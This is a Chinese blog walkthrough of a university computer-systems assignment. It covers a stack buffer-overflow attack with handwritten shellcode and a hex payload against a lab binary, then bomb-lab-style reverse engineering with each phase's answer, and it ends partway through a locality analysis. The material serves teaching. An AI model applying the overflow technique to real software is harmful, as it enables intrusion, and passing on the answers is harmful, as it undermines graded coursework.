---
url: final-homework
title: 计算机系统基础大作业
date: 2020-05-31 13:22:00
categories: [技术]
tags: [计算机系统实验]
---

Final Homework - 攻击+拆弹+分析

<!--more-->

**声明：请独立思考并完成实验。本文只是提供一些思路，禁止作为实验报告使用。**

---

本实验包含：**攻击**、**拆弹**、**程序局部性特性分析**和**虚拟内存使用分析**四部分。

建议提前阅读：

- [Attack Lab](https://superpung.com/attack-lab/)
- [Bomb Lab](https://superpung.com/bomb-lab/)

并准备好实验环境，不要出现下面这种情况。

<img src="https://i0.hdslb.com/bfs/album/040d10d8a959d2125e43241c185fca30df5ee2cf.jpg" alt="problem" style="zoom:50%;" />

---

开始实验前，请记住：

- **磨刀不误砍柴工**

  认真阅读资料和指导书，做好知识储备

  准备好系统环境

- **自省**

  遇到错误首先反思自身，而不是怀疑他人

- **认真**

  越是细节的地方越容易出问题

- **黎明前总是最黑暗的**

  需要信心和坚持

本文所有操作均基于以下环境：

- OS: Ubuntu 18.04.4 LTS (Linux ubuntu 5.3.0-46-generic x86_64)
- Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
- Compiler: gcc version 7.5.0

*注：需要接入互联网。*

实验材料：

- `exam`：实验目标，需要进行破解的程序
- `hex2raw`：将格式化的十六进制文本转换成ascii码（使用方法见[Attack Lab](https://superpung.com/attack-lab/)）

首先使用`objdump`反汇编`exam`：

```shell
linux> objdump -d exam > exam.s
```

实验开始。

---

# 任务一——攻击

攻击针对的是`exam`程序中的`doSomething`函数，因为它存在缓冲区溢出漏洞，相信做过Attack Lab的都知道。

任务一是开启后续实验的大门，所以至关重要。

指导中给出了`main`函数的C代码：

```c
int main()
{
  ......
  doSomething();
  sad_ending();

  return 0;
}
```

可以发现，如果让`doSomething`函数正常返回，则会直接调用`sad_ending`函数，意味着整个实验的失败：

```shell
You failed! (T_T)
```

所以我们不能让`doSomething`函数正常返回，再看指导中给出的`doSomething`函数的C代码：

```c
char doSomething()
{
  char buf[0x20];
  puts("Input sth. please.");
  gets(buf);
  return buf[0];
}
```

发现`char buf[0x20];`分配0x20大小的空间，有缓冲区溢出的漏洞。等等，直接给出了缓冲区的大小？

在`exam.s`中找到`doSomething`函数：

```assembly
0000000000401830 <doSomething>:
  401830:	48 83 ec 28          	sub    $0x28,%rsp
```

发现401830实际分配的空间是0x28大小，果然事情没有那么简单。

---

根据指导的要求，需要将程序的控制流导入至`entrance`函数：

```c
void entrance(int cookie)
{

  if (cookie != COOKIE) {
    puts("Opps! Invalid cookie");
    sad_ending();
  }

  ...

}
```

而且需要传递参数`cookie`，且必须等于某个常数`COOKIE`。

找到`entrance`函数：

```assembly
00000000004018b2 <entrance>:
  4018b2:	55                   	push   %rbp
  4018b3:	53                   	push   %rbx
  4018b4:	48 83 ec 08          	sub    $0x8,%rsp
  4018b8:	89 fd                	mov    %edi,%ebp
  4018ba:	48 8d 3d 7f 09 00 00 	lea    0x97f(%rip),%rdi        # 402240 <_IO_stdin_used+0x240>
  4018c1:	e8 7a f7 ff ff       	callq  401040 <puts@plt>
  4018c6:	81 fd df ac f9 f5    	cmp    $0xf5f9acdf,%ebp
  4018cc:	75 4f                	jne    40191d <entrance+0x6b>
  ...
  40191d:	48 8d 3d 77 08 00 00 	lea    0x877(%rip),%rdi        # 40219b <_IO_stdin_used+0x19b>
  401924:	e8 17 f7 ff ff       	callq  401040 <puts@plt>
  401929:	b8 00 00 00 00       	mov    $0x0,%eax
  40192e:	e8 b1 fe ff ff       	callq  4017e4 <sad_ending>
```

发现`entrance`函数的地址是`0x4018b2`。

4010b8将传入的参数给了`%ebp`，4018c6将`%ebp`和`0xf5f9acdf`比较，若不相等则跳到40191d，继续执行则直接调用`sad_ending`函数使实验失败。

可以看出，`COOKIE`值就是`0xf5f9acdf`。*（为什么会有人把它当作地址？）*

*这波操作和Attack Lab的`Level 2`极其相似，所以不过多解释，可以再复习一遍[Attack Lab](https://superpung.com/attack-lab/)。*

---

编写汇编文件`entrance.s`，重定向至`entrance` 函数，并传入参数`COOKIE`：

```assembly
mov     $0xf5f9acdf,%rdi    # cookie
push    $0x4018b2           # address of entrance
ret

```

汇编：

```shell
gcc -c entrance.s
```

反汇编：

```shell
objdump -d entrance.o
```

得到输出如下：

```shell

entrance.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 bf df ac f9 f5 00 	movabs $0xf5f9acdf,%rdi
   7:	00 00 00
   a:	68 b2 18 40 00       	pushq  $0x4018b2
   f:	c3                   	retq
```

得到字节码：

```assembly
48 bf df ac f9 f5 00        /* movabs $0xf5f9acdf,%rdi */
00 00 00
68 b2 18 40 00              /* pushq  $0x4018b2 */
c3                          /* retq */
```

---

接下来，寻找缓冲区`%rsp`的起始地址，利用`gdb`：

```shell
gdb exam
```

打断点：

```shell
(gdb) b doSomething
```

运行：

```shell
(gdb) r
```

单步跟踪：

```shell
(gdb) si
```

此时执行到`401830:    sub    $0x28,%rsp`处，打印`%rsp`的值（地址）：

```shell
(gdb) p/x $rsp
```

得到输出如下：

```shell
$1 = 0x55585fd0
```

即`%rsp`的地址是`0x55585fd0`，此即缓冲区的起始地址。

---

编辑用于攻击的字符串文件`data.txt`（**注意注释周围的空格、机器为小端法**）：

```shell
48 bf df ac f9 f5 00        /* movabs $0xf5f9acdf,%rdi */
00 00 00
68 b2 18 40 00              /* pushq  $0x4018b2 */
c3                          /* retq */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
d0 5f 58 55 00 00 00 00     /* address of %rsp in doSomething */
```

利用`hex2raw`输入到`exam`*（为什么有人还在加`-q`？）*：

```shell
./hex2raw < data.txt | ./exam
```

得到输出如下：

```shell
Input sth. please.

Ohh! You have found the entrance.
```

完成。

---

如果你觉得攻击实验很有趣，不妨做一下更有趣的Attack Lab。

# 任务二——拆弹

和Bomb Lab极其相似，细节不再赘述，可以再复习一遍[Bomb Lab](https://superpung.com/bomb-lab/)。

> 关于寄存器的常识：
>
> - 每个寄存器都有它特有的功能；
> - `%rsp`：栈顶指针；
> - `%rdi`：函数的第一个参数；
> - `%rsi`：函数的第二个参数；
> - `%rdx`：函数的第三个参数；
> - `%rcx`：函数的第四个参数；
> - `%rax`：函数的返回值。

## Phase 0: *string*

`phase_0`对应的汇编语句如下：

```assembly
000000000040139f <phase_0>:
  40139f:	53                   	push   %rbx
  4013a0:	48 81 ec 00 02 00 00 	sub    $0x200,%rsp
  4013a7:	48 8b 0d 12 2d 00 00 	mov    0x2d12(%rip),%rcx        # 4040c0 <stdout@@GLIBC_2.2.5>
  4013ae:	ba 17 00 00 00       	mov    $0x17,%edx
  4013b3:	be 01 00 00 00       	mov    $0x1,%esi
  4013b8:	48 8d 3d 7b 0c 00 00 	lea    0xc7b(%rip),%rdi        # 40203a <_IO_stdin_used+0x3a>
  4013bf:	e8 3c fd ff ff       	callq  401100 <fwrite@plt>
  4013c4:	48 89 e3             	mov    %rsp,%rbx
  4013c7:	be 00 02 00 00       	mov    $0x200,%esi
  4013cc:	48 89 df             	mov    %rbx,%rdi
  4013cf:	e8 d5 03 00 00       	callq  4017a9 <read_line>
  4013d4:	ba 30 00 00 00       	mov    $0x30,%edx
  4013d9:	48 89 de             	mov    %rbx,%rsi
  4013dc:	48 8d 3d 75 0c 00 00 	lea    0xc75(%rip),%rdi        # 402058 <_IO_stdin_used+0x58>
  4013e3:	e8 93 07 00 00       	callq  401b7b <_strncmp>
  4013e8:	85 c0                	test   %eax,%eax
  4013ea:	75 09                	jne    4013f5 <phase_0+0x56>
  4013ec:	48 81 c4 00 02 00 00 	add    $0x200,%rsp
  4013f3:	5b                   	pop    %rbx
  4013f4:	c3                   	retq
  4013f5:	b8 00 00 00 00       	mov    $0x0,%eax
  4013fa:	e8 e5 03 00 00       	callq  4017e4 <sad_ending>
  4013ff:	eb eb                	jmp    4013ec <phase_0+0x4d>
```

---

我不再像Bomb Lab中进行分段分析。直接找到会导致`sad_ending`的条件：

```assembly
  4013e3:	e8 93 07 00 00       	callq  401b7b <_strncmp>
  4013e8:	85 c0                	test   %eax,%eax
  4013ea:	75 09                	jne    4013f5 <phase_0+0x56>
  ...
  4013f5:	b8 00 00 00 00       	mov    $0x0,%eax
  4013fa:	e8 e5 03 00 00       	callq  4017e4 <sad_ending>
```

4013e3调用了`_strncmp`函数，指导中给出了说明：

> `_strncmp(char *, char *, int)`：对两个字符串进行比较

然后4013e8和4013ea判断返回值`%eax`是否为零，不为零则跳到4013f5，继续执行导致`sad_ending`。

得出结论：`_strncmp`函数的返回值必须为零，即传入的两个字符串必须相等。

---

下面就找一下传入的参数分别是什么，即`%rdi`、`%rsi`和`%rdx`的值。

```assembly
  4013d4:	ba 30 00 00 00       	mov    $0x30,%edx
  4013d9:	48 89 de             	mov    %rbx,%rsi
  4013dc:	48 8d 3d 75 0c 00 00 	lea    0xc75(%rip),%rdi        # 402058 <_IO_stdin_used+0x58>
```

可以看出：

- `%rdi`存放的是地址`0x402058`；
- `%rsi`存放的是`%rbx`的值；
- `%rdx`的值为0x30。

```assembly
  4013cc:	48 89 df             	mov    %rbx,%rdi
  4013cf:	e8 d5 03 00 00       	callq  4017a9 <read_line>
```

发现4013cc将`%rbx`传给`read_line`读取一行字符串，即`%rbx`存放的是我们输入的字符串的地址，即为`%rsi`的值。

---

利用`gdb`查看地址`0x402058`处的值：

```shell
gdb exam
(gdb) x/s 0x402058
```

得到输出如下：

```shell
0x402058:	"But we loved with a love that was more than love"
```

这句“But we loved with a love that was more than love”出自[安娜贝尔·丽](https://baike.baidu.com/item/安娜贝尔·丽)，意为“可我们的爱超越一切，无人能及”。

全诗放在文章结尾，供欣赏。

---

现在已经很清楚了，传给`_strncmp`的三个参数分别为上面的诗句、我们输入的字符串和0x30。可以发现，诗句的长度就是48个字符，也就是0x30个字符。

综上，`phase_0`的密码就是：

```shell
But we loved with a love that was more than love
```

---

但是注意本次实验与Bomb Lab的不同之处，要求所有的输入均通过`data.txt`并利用`hex2raw`，所以需要将我们得出的所有信息均转换成十六进制字符，**包括否定跳过的`n`、换行符**。

编写用于转换成十六进制的程序`raw2hex`：

```c
#include <string.h>
#include <stdio.h>

int main()
{
    int size = 100;
    char* raw_str = (char*)malloc(size);
    gets(raw_str);
    int len = strlen(raw_str);
    for (int i = 0; i < len; i++)
        printf("%x ", raw_str[i]);
    printf("0a\n");
    free(raw_str);
    return 0;
}
```

将字符串转换成ascii码后填入`data.txt`，别忘了前面加上否定跳过的字符。

## Phase 1: *string array*

`phase_1`对应的汇编语句如下：

```assembly
0000000000401731 <phase_1>:
  401731:	53                   	push   %rbx
  401732:	48 83 ec 50          	sub    $0x50,%rsp
  401736:	48 8b 0d 83 29 00 00 	mov    0x2983(%rip),%rcx        # 4040c0 <stdout@@GLIBC_2.2.5>
  40173d:	ba 17 00 00 00       	mov    $0x17,%edx
  401742:	be 01 00 00 00       	mov    $0x1,%esi
  401747:	48 8d 3d 6f 09 00 00 	lea    0x96f(%rip),%rdi        # 4020bd <_IO_stdin_used+0xbd>
  40174e:	e8 ad f9 ff ff       	callq  401100 <fwrite@plt>
  401753:	48 89 e3             	mov    %rsp,%rbx
  401756:	be 50 00 00 00       	mov    $0x50,%esi
  40175b:	48 89 df             	mov    %rbx,%rdi
  40175e:	e8 46 00 00 00       	callq  4017a9 <read_line>
  401763:	48 89 df             	mov    %rbx,%rdi
  401766:	e8 5f 04 00 00       	callq  401bca <_strlen>
  40176b:	83 f8 04             	cmp    $0x4,%eax
  40176e:	7e 21                	jle    401791 <phase_1+0x60>
  401770:	80 3c 24 39          	cmpb   $0x39,(%rsp)
  401774:	75 27                	jne    40179d <phase_1+0x6c>
  401776:	80 7c 24 01 51       	cmpb   $0x51,0x1(%rsp)
  40177b:	75 20                	jne    40179d <phase_1+0x6c>
  40177d:	80 7c 24 02 2a       	cmpb   $0x2a,0x2(%rsp)
  401782:	75 19                	jne    40179d <phase_1+0x6c>
  401784:	80 7c 24 03 61       	cmpb   $0x61,0x3(%rsp)
  401789:	75 12                	jne    40179d <phase_1+0x6c>
  40178b:	48 83 c4 50          	add    $0x50,%rsp
  40178f:	5b                   	pop    %rbx
  401790:	c3                   	retq
  401791:	b8 00 00 00 00       	mov    $0x0,%eax
  401796:	e8 49 00 00 00       	callq  4017e4 <sad_ending>
  40179b:	eb d3                	jmp    401770 <phase_1+0x3f>
  40179d:	b8 00 00 00 00       	mov    $0x0,%eax
  4017a2:	e8 3d 00 00 00       	callq  4017e4 <sad_ending>
  4017a7:	eb e2                	jmp    40178b <phase_1+0x5a>
```

---

找到会调用`sad_ending`的语句：

```assembly
  401763:	48 89 df             	mov    %rbx,%rdi
  401766:	e8 5f 04 00 00       	callq  401bca <_strlen>
  40176b:	83 f8 04             	cmp    $0x4,%eax
  40176e:	7e 21                	jle    401791 <phase_1+0x60>
  401770:	80 3c 24 39          	cmpb   $0x39,(%rsp)
  401774:	75 27                	jne    40179d <phase_1+0x6c>
  401776:	80 7c 24 01 51       	cmpb   $0x51,0x1(%rsp)
  40177b:	75 20                	jne    40179d <phase_1+0x6c>
  40177d:	80 7c 24 02 2a       	cmpb   $0x2a,0x2(%rsp)
  401782:	75 19                	jne    40179d <phase_1+0x6c>
  401784:	80 7c 24 03 61       	cmpb   $0x61,0x3(%rsp)
  401789:	75 12                	jne    40179d <phase_1+0x6c>
  ...
  401791:	b8 00 00 00 00       	mov    $0x0,%eax
  401796:	e8 49 00 00 00       	callq  4017e4 <sad_ending>
  ...
  40179d:	b8 00 00 00 00       	mov    $0x0,%eax
  4017a2:	e8 3d 00 00 00       	callq  4017e4 <sad_ending>
```

401763和401766把`%rbx`传参并调用`_strlen`：

> `_strlen(char *)`：计算字符串的长度

然后40176b和40176e判断其返回值是否不超过4，若不超过4则跳到401791，继续执行导致`sad_ending`。可知`%rbx`处的字符串长度至少为5。

401770～401789分别判断了`%rsp`处的前4个值是否依次为`0x39`、`0x51`、`0x2a`和`0x61`，有一个不相等则跳到40179d，继续执行导致`sad_ending`。可知`%rsp`处的前4个值必须依次为`0x39`、`0x51`、`0x2a`和`0x61`。

---

```assembly
  401753:	48 89 e3             	mov    %rsp,%rbx
  ...
  40175b:	48 89 df             	mov    %rbx,%rdi
  40175e:	e8 46 00 00 00       	callq  4017a9 <read_line>
```

401753将`%rsp`传给了`%rbx`，40175b和40175e又将`%rbx`传给了`%rdi`作为参数调用`read_line`读取一行输入。

可知`%rsp`和`%rbx`均指向了我们输入的字符串。

注意`0x0a`也会记入读入字符串的长度，且理论上在后面添加任意字符均可（长度大于4即可）。

但如果在`0x61`之后添加`0x00`，当`_strlen`判断时会提前终止，返回字符串长度为4，导致`sad_ending`。

---

综上分析，`phase_1`的密码就是：

```shell
39 51 2a 61
```

## Phase 2: *link list&recursion*

### `phase_2`

`phase_2`对应的汇编语句如下：

```assembly
0000000000401ae0 <phase_2>:
  401ae0:	41 55                	push   %r13
  401ae2:	41 54                	push   %r12
  401ae4:	55                   	push   %rbp
  401ae5:	53                   	push   %rbx
  401ae6:	48 83 ec 58          	sub    $0x58,%rsp
  401aea:	48 8b 0d cf 25 00 00 	mov    0x25cf(%rip),%rcx        # 4040c0 <stdout@@GLIBC_2.2.5>
  401af1:	ba 17 00 00 00       	mov    $0x17,%edx
  401af6:	be 01 00 00 00       	mov    $0x1,%esi
  401afb:	48 8d 3d d2 07 00 00 	lea    0x7d2(%rip),%rdi        # 4022d4 <_IO_stdin_used+0x2d4>
  401b02:	e8 f9 f5 ff ff       	callq  401100 <fwrite@plt>
  401b07:	48 89 e7             	mov    %rsp,%rdi
  401b0a:	be 50 00 00 00       	mov    $0x50,%esi
  401b0f:	e8 95 fc ff ff       	callq  4017a9 <read_line>
  401b14:	bf 10 00 00 00       	mov    $0x10,%edi
  401b19:	e8 a2 f5 ff ff       	callq  4010c0 <malloc@plt>
  401b1e:	48 89 c3             	mov    %rax,%rbx
  401b21:	48 8d 2d c4 07 00 00 	lea    0x7c4(%rip),%rbp        # 4022ec <_IO_stdin_used+0x2ec>
  401b28:	4c 8d 65 0a          	lea    0xa(%rbp),%r12
  401b2c:	49 89 c5             	mov    %rax,%r13
  401b2f:	bf 10 00 00 00       	mov    $0x10,%edi
  401b34:	e8 87 f5 ff ff       	callq  4010c0 <malloc@plt>
  401b39:	49 89 45 08          	mov    %rax,0x8(%r13)
  401b3d:	0f b6 55 00          	movzbl 0x0(%rbp),%edx
  401b41:	88 10                	mov    %dl,(%rax)
  401b43:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
  401b4a:	00
  401b4b:	48 83 c5 01          	add    $0x1,%rbp
  401b4f:	4c 39 e5             	cmp    %r12,%rbp
  401b52:	75 d8                	jne    401b2c <phase_2+0x4c>
  401b54:	48 89 e6             	mov    %rsp,%rsi
  401b57:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
  401b5b:	e8 39 ff ff ff       	callq  401a99 <recursion>
  401b60:	85 c0                	test   %eax,%eax
  401b62:	75 0b                	jne    401b6f <phase_2+0x8f>
  401b64:	48 83 c4 58          	add    $0x58,%rsp
  401b68:	5b                   	pop    %rbx
  401b69:	5d                   	pop    %rbp
  401b6a:	41 5c                	pop    %r12
  401b6c:	41 5d                	pop    %r13
  401b6e:	c3                   	retq
  401b6f:	b8 00 00 00 00       	mov    $0x0,%eax
  401b74:	e8 6b fc ff ff       	callq  4017e4 <sad_ending>
  401b79:	eb e9                	jmp    401b64 <phase_2+0x84>
```

---

`phase_2`的结构较为复杂，它和`phase_3`一起，作为整个实验的核心，下面分段分析：

---

```assembly
  401ae0:	41 55                	push   %r13
  401ae2:	41 54                	push   %r12
  401ae4:	55                   	push   %rbp
  401ae5:	53                   	push   %rbx
  401ae6:	48 83 ec 58          	sub    $0x58,%rsp
  401aea:	48 8b 0d cf 25 00 00 	mov    0x25cf(%rip),%rcx        # 4040c0 <stdout@@GLIBC_2.2.5>
  401af1:	ba 17 00 00 00       	mov    $0x17,%edx
  401af6:	be 01 00 00 00       	mov    $0x1,%esi
  401afb:	48 8d 3d d2 07 00 00 	lea    0x7d2(%rip),%rdi        # 4022d4 <_IO_stdin_used+0x2d4>
  401b02:	e8 f9 f5 ff ff       	callq  401100 <fwrite@plt>
```

401ae0～401ae5将`%r13`、`%r12`、`%rbp`和`%rbx`依次压入栈，401ae6将栈顶指针移动`0x58`。

401aea把地址0x4040c0给`%rcx`。

401af1～401b02调用`fwrite`函数，参数分别是地址0x4022d4、0x1和0x17，是用于提示的字符串。

---

```assembly
  401b07:	48 89 e7             	mov    %rsp,%rdi
  401b0a:	be 50 00 00 00       	mov    $0x50,%esi
  401b0f:	e8 95 fc ff ff       	callq  4017a9 <read_line>
```

401b07～401b0f调用`read_line`函数，参数分别是`%rsp`和0x50，即把我们输入的字符串存放到`%rsp`处，且最大长度是0x50。

---

```assembly
  401b14:	bf 10 00 00 00       	mov    $0x10,%edi
  401b19:	e8 a2 f5 ff ff       	callq  4010c0 <malloc@plt>
  401b1e:	48 89 c3             	mov    %rax,%rbx
  401b21:	48 8d 2d c4 07 00 00 	lea    0x7c4(%rip),%rbp        # 4022ec <_IO_stdin_used+0x2ec>
  401b28:	4c 8d 65 0a          	lea    0xa(%rbp),%r12
  401b2c:	49 89 c5             	mov    %rax,%r13
  401b2f:	bf 10 00 00 00       	mov    $0x10,%edi
  401b34:	e8 87 f5 ff ff       	callq  4010c0 <malloc@plt>
  401b39:	49 89 45 08          	mov    %rax,0x8(%r13)
  401b3d:	0f b6 55 00          	movzbl 0x0(%rbp),%edx
  401b41:	88 10                	mov    %dl,(%rax)
  401b43:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
  401b4a:	00
  401b4b:	48 83 c5 01          	add    $0x1,%rbp
  401b4f:	4c 39 e5             	cmp    %r12,%rbp
  401b52:	75 d8                	jne    401b2c <phase_2+0x4c>
```

401b14～401b1e调用`malloc`函数分配内存，参数是0x10，返回值给了`%rbx`，即分配了0x10大小的空间，其地址存放在`%rbx`处。

下面为`for`循环，转换成C代码，并适当改写：

```c
int* list = new int[2]; // %rax
int* head = list; // %rbx
char* str = 0x4022ec; // %rbp
for (int i = 0; i != 10; i++) { // %rbp != %r12
	int* temp = list; // %rax->%r13
  temp[1] = new int[2]; // %r13+8
  list = temp; // return of malloc
  list[0] = str[i]; // %rbp->%edx->(%rax)
  list[1] = NULL; // 0->(%rax+8)
}
```

可以发现此处创建了一个带头链表，头指针存放在`%rbx`中，`list[0]`为数据域、`list[1]`为指针域。并将`0x4022ec`处的字符串的每个字符存放到链表中，可以看出一共有10个字符。

利用`gdb`查看`0x4022ec`处的字符串的ascii码：

```shell
gdb exam
(gdb) x/10x 0x4022ec
```

得到输出如下：

```shell
0x4022ec:	0x4c	0x6f	0x28	0x79	0x68	0x77	0x43	0x2c
0x4022f4:	0x24	0x47
```

即10个字符的ascii码为：

```shell
0x4c	0x6f	0x28	0x79	0x68	0x77	0x43	0x2c  0x24	0x47
```

---

```assembly
  401b54:	48 89 e6             	mov    %rsp,%rsi
  401b57:	48 8b 7b 08          	mov    0x8(%rbx),%rdi
  401b5b:	e8 39 ff ff ff       	callq  401a99 <recursion>
  401b60:	85 c0                	test   %eax,%eax
  401b62:	75 0b                	jne    401b6f <phase_2+0x8f>
  401b64:	48 83 c4 58          	add    $0x58,%rsp
  401b68:	5b                   	pop    %rbx
  401b69:	5d                   	pop    %rbp
  401b6a:	41 5c                	pop    %r12
  401b6c:	41 5d                	pop    %r13
  401b6e:	c3                   	retq
  401b6f:	b8 00 00 00 00       	mov    $0x0,%eax
  401b74:	e8 6b fc ff ff       	callq  4017e4 <sad_ending>
  401b79:	eb e9                	jmp    401b64 <phase_2+0x84>
```

401b54～401b5b调用`recursion`函数，将`%rsp`传给`%rsi`，即将我们输入的字符串作为第二个参数；将`%rbx+8`传给`%rdi`，即将链表起始地址作为第一个参数。

401b60和401b62检查`recursion`函数的返回值是否为零，若不为零则跳到401b6f，继续执行导致`sad_ending`。可知`recursion`函数的返回值必须为零。

无论是否`sad_ending`，最后执行401b64～401b6e，弹栈返回。

### `recursion`

`recursion`函数对应的汇编语句如下：

```assembly
0000000000401a99 <recursion>:
  401a99:	48 85 ff             	test   %rdi,%rdi
  401a9c:	74 2a                	je     401ac8 <recursion+0x2f>
  401a9e:	0f b6 06             	movzbl (%rsi),%eax
  401aa1:	3c 0a                	cmp    $0xa,%al
  401aa3:	74 2f                	je     401ad4 <recursion+0x3b>
  401aa5:	0f be 17             	movsbl (%rdi),%edx
  401aa8:	83 c2 01             	add    $0x1,%edx
  401aab:	0f be c0             	movsbl %al,%eax
  401aae:	39 c2                	cmp    %eax,%edx
  401ab0:	75 28                	jne    401ada <recursion+0x41>
  401ab2:	48 83 ec 08          	sub    $0x8,%rsp
  401ab6:	48 83 c6 01          	add    $0x1,%rsi
  401aba:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
  401abe:	e8 d6 ff ff ff       	callq  401a99 <recursion>
  401ac3:	48 83 c4 08          	add    $0x8,%rsp
  401ac7:	c3                   	retq
  401ac8:	80 3e 0a             	cmpb   $0xa,(%rsi)
  401acb:	0f 95 c0             	setne  %al
  401ace:	0f b6 c0             	movzbl %al,%eax
  401ad1:	f7 d8                	neg    %eax
  401ad3:	c3                   	retq
  401ad4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401ad9:	c3                   	retq
  401ada:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401adf:	c3                   	retq
```

---

从名字可以看出，它是一个递归函数，实际上也是如此。

转换成C代码，并适当改写：

 ```c
int index = 0; // index of input string
int recursion(int* list, int index) { // %rdi(link list), %rsi(index of input string)
  if (list == NULL) { // %rdi == 0
    if (input[index] == 0x0a) // (%rsi) == 0xa
      return 0;
    else
      return -1;
  }
  char a = input[index]; // (%rsi)->%eax
  if (a == 0x0a)
    return -1;
  char b = list->data; // (%rdi)->%edx
  b++; //%edx++
  if (a != b)
    return -1;

  index++; // %rsi++
  list = list->next; // %rdi+=8
  recursion(list, index);
}
 ```

可以看出，递归函数的功能是将链表中存放的字符串的每个字符增1后与我们输入的字符串的每个字符进行比较，全部相等则返回0，否则返回1。

---

综上分析，我们只需输入已知字符串加1后的结果即可。

所以，`phase_2`的密码就是：

```shell
4d 70 29 7a 69 78 44 2d 25 48 0a
```

---

如果你觉得拆弹实验很有趣，不妨做一下更有趣的Bomb Lab。

# 任务三——程序局部性特性分析

什么是程序的局部性？

> 程序倾向于引用邻近于**其他最近引用过的数据项**的数据项，或者最近引用过的数据项本身，这种倾向性被称为**局部性原理（principle of locality）**。

局部性有何种形式？

> 局部性分为**时间局部性（temporal locality）**和**空间局部性（spatial locality）**：
>
> - 在一个具有良好时间局部性的程序中，被引用过一次的内存位置很可能在不远的将来再被多次引用；
> - 在一个具有良好空间局部性的程序中，如果一个内存位置被引用了一次，那么程序很可能在不远的将来引用附近的一个内存位置。

局部性有什么作用？

> 有良好局部性的程序比局部性差的程序运行得更快。

如何量化评价程序的局部性？

> - **重复引用**相同变量的程序有良好的时间局部性。
> - 对于具有步长为`k`的引用模式的程序，**步长越小**，空间局部性越好。具有步长为1的引用模式的程序有很好的空间局部性。在内存中以大步长跳来跳去的程序空间局部性会很差。
> - 对于取指令来说，**循环**有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。

---

## Phase 3: *switch*

`phase_3`对应的汇编语句如下：

```assembly
0000000000401325 <phase_3>:
  401325:	48 83 ec 18          	sub    $0x18,%rsp
  401329:	48 8b 0d 90 2d 00 00 	mov    0x2d90(%rip),%rcx        # 4040c0 <stdout@@GLIBC_2.2.5>
  401330:	ba 31 00 00 00       	mov    $0x31,%edx
  401335:	be 01 00 00 00       	mov    $0x1,%esi
  40133a:	48 8d 3d c7 0c 00 00 	lea    0xcc7(%rip),%rdi        # 402008 <_IO_stdin_used+0x8>
  401341:	e8 ba fd ff ff       	callq  401100 <fwrite@plt>
  401346:	48 8d 7c 24 0b       	lea    0xb(%rsp),%rdi
  40134b:	be 05 00 00 00       	mov    $0x5,%esi
  401350:	e8 54 04 00 00       	callq  4017a9 <read_line>
  401355:	0f b6 44 24 0b       	movzbl 0xb(%rsp),%eax
  40135a:	3c 30                	cmp    $0x30,%al
  40135c:	74 17                	je     401375 <phase_3+0x50>
  40135e:	3c 31                	cmp    $0x31,%al
  401360:	74 21                	je     401383 <phase_3+0x5e>
  401362:	3c 32                	cmp    $0x32,%al
  401364:	74 2b                	je     401391 <phase_3+0x6c>
  401366:	b8 00 00 00 00       	mov    $0x0,%eax
  40136b:	e8 74 04 00 00       	callq  4017e4 <sad_ending>
  401370:	48 83 c4 18          	add    $0x18,%rsp
  401374:	c3                   	retq
  401375:	48 8d 3d 84 2d 00 00 	lea    0x2d84(%rip),%rdi        # 404100 <array>
  40137c:	e8 fb fe ff ff       	callq  40127c <sum_0>
  401381:	eb ed                	jmp    401370 <phase_3+0x4b>
  401383:	48 8d 3d 76 2d 00 00 	lea    0x2d76(%rip),%rdi        # 404100 <array>
  40138a:	e8 45 ff ff ff       	callq  4012d4 <sum_1>
  40138f:	eb df                	jmp    401370 <phase_3+0x4b>
  401391:	48 8d 3d 68 2d 00 00 	lea    0x2d68(%rip),%rdi        # 404100 <array>
  401398:	e8 89 fe ff ff       	callq  401226 <sum_2>
  40139d:	eb d1                	jmp    401370 <phase_3+0x4b>
```

---

可以看出其核心是：

```c
switch (x) {
  case 0x30: {sum_0(array);break;} // array from 0x401000
  case 0x31: {sum_1(array);break;} // array from 0x401000
  case 0x32: {sum_2(array);break;} // array from 0x401000
  default: sad_ending();
}
```

我们需要分析三个`sum`函数，选择局部性最好的一个，并输入对应的符号（`0x30`、`0x31`或`0x32`）。

## sum: *loop*

三个`sum`函数的参数都是一个数组，但使用不同的算法实现了相同的功能。

根据名字推测其功能是对数组求和。

`phase_3`中`sum`的结构较为复杂，它和`phase_2`一起，作为整个实验的核心。

### `sum_0`

`sum_0`对应的汇编语句如下：

```assembly
000000000040127c <sum_0>:
  40127c:	48 8d b7 00 02 20 00 	lea    0x200200(%rdi),%rsi
  401283:	bf 00 00 00 00       	mov    $0x0,%edi
  401288:	ba 00 00 00 00       	mov    $0x0,%edx
  40128d:	eb 38                	jmp    4012c7 <sum_0+0x4b>
  40128f:	48 81 c1 00 80 00 00 	add    $0x8000,%rcx
  401296:	48 39 f1             	cmp    %rsi,%rcx
  401299:	74 15                	je     4012b0 <sum_0+0x34>
  40129b:	48 8d 81 00 fe ff ff 	lea    -0x200(%rcx),%rax
  4012a2:	48 03 10             	add    (%rax),%rdx
  4012a5:	48 83 c0 08          	add    $0x8,%rax
  4012a9:	48 39 c8             	cmp    %rcx,%rax
  4012ac:	75 f4                	jne    4012a2 <sum_0+0x26>
  4012ae:	eb df                	jmp    40128f <sum_0+0x13>
  4012b0:	48 81 c6 00 02 00 00 	add    $0x200,%rsi
  4012b7:	48 81 c7 00 02 00 00 	add    $0x200,%rdi
  4012be:	48 81 ff 00 80 00 00 	cmp    $0x8000,%rdi
  4012c5:	74 09                	je     4012d0 <sum_0+0x54>
  4012c7:	48 8d 8e 00 00 e0 ff 	lea    -0x200000(%rsi),%rcx
  4012ce:	eb cb                	jmp    40129b <sum_0+0x1f>
  4012d0:	48 89 d0             	mov    %rdx,%rax
  4012d3:	c3                   	retq
```

---

转换成C代码：

```c
int sum_0(int* array) {
  int sum = 0; // %edx
  int* end = array + 262208; // 0x200200(%rdi)->%rsi
  for (int i = 0; i != 32768; end += 64, i += 512) // 0x0->%edi
    for (int* mid = end - 262144; mid != end; mid += 4096) // -0x200000(%rsi)->%rcx
      for (int* begin = mid - 64; begin != mid; begin++) // -0x200(%rcx)->%rax
